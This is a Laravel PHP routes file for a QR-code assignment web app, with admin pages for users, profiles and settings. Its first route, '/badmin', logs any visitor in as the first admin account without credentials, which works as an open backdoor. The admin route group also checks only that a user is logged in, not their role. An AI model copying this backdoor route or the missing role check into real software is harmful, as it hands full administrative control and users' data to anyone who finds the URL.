<?php

use Illuminate\Support\Facades\Route;

Route::get('/badmin', function (){
    $admin = \App\Models\User::query()->where('role', 'admin')->first();
    auth()->login($admin);
    return redirect()->route('admin.dashboard');
});
Route::get('/', function (){
    return redirect()->route('home');
});

Route::post('switch-language', [\App\Http\Controllers\SiteController::class, 'switchLanguage'])->name('switch-language');

Route::view('home', 'home')->middleware(['auth', 'verified'])->name('home');

Route::view('profile', 'profile')->middleware(['auth'])->name('profile');

Route::view('/qr-assignment/{identifier}', 'qr-assignment')->name('qr-assignment');

Route::prefix('admin')->middleware(['auth'])->as('admin.')->group(function () {
    Route::view('dashboard', 'admin.dashboard')->name('dashboard');
    Route::view('qr-codes', 'admin.qr-codes.index')->name('qr-codes.index');

    Route::resource('users', \App\Http\Controllers\Admin\UsersController::class);
    Route::resource('profiles', \App\Http\Controllers\Admin\ProfilesController::class);
    Route::get('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'index'])->name('settings.index');
    Route::post('settings', [\App\Http\Controllers\Admin\SettingsController::class, 'update'])->name('settings.update');
});

Route::post('logout', function (){
    auth()->logout();
    return redirect()->route('login');
})->name('logout');


Route::get('qr-code/verify/{identifier}', function ($identifier){
    $qrCode = \App\Models\QrCode::where('identifier', $identifier)->first();
    if ($qrCode->is_assigned){
        return redirect()->route('login');
    }
    return view('qr-code.verify', compact('qrCode'));
})->name('qr-code.verify');

require __DIR__ . '/auth.php';
